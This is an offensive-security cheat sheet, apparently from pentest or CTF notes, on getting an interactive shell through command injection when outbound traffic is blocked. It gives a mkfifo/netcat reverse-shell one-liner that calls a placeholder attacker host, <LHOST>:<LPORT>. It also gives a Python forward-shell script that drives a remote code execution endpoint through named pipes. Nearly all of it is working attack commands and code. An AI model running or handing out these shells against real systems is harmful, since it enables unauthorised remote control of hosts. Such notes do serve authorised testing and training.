# Forward Shell (mkfifo Named Pipe)

When you have command injection but can't get a reverse shell (firewall, WAF blocking outbound connections), use a named pipe to create an interactive shell over the existing HTTP channel.

## Setup Named Pipe on Target
Inject these commands via RCE:
```bash
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f
```

## Python Forward Shell (IppSec method)
Use a Python script to send stdin and read stdout via separate HTTP requests to the RCE endpoint:

```python
import requests, time, sys, urllib.parse

url = "http://<TARGET>/rce"

def run_cmd(cmd):
    data = {"cmd": cmd}
    r = requests.post(url, data=data)
    return r.text

# Setup named pipe
run_cmd("mkfifo /tmp/input; tail -f /tmp/input | /bin/bash 2>&1 > /tmp/output &")

while True:
    cmd = input("$ ")
    # Write to input pipe
    run_cmd(f"echo '{cmd}' > /tmp/input")
    time.sleep(0.5)
    # Read output
    out = run_cmd("cat /tmp/output && echo '' > /tmp/output")
    print(out)
```

## Notes
- Used when outbound connections blocked but inbound HTTP to target works
- Works with any RCE that allows chaining commands
- `/tmp/input` feeds stdin, `/tmp/output` captures stdout/stderr
- Upgrade to proper reverse shell once network path opens
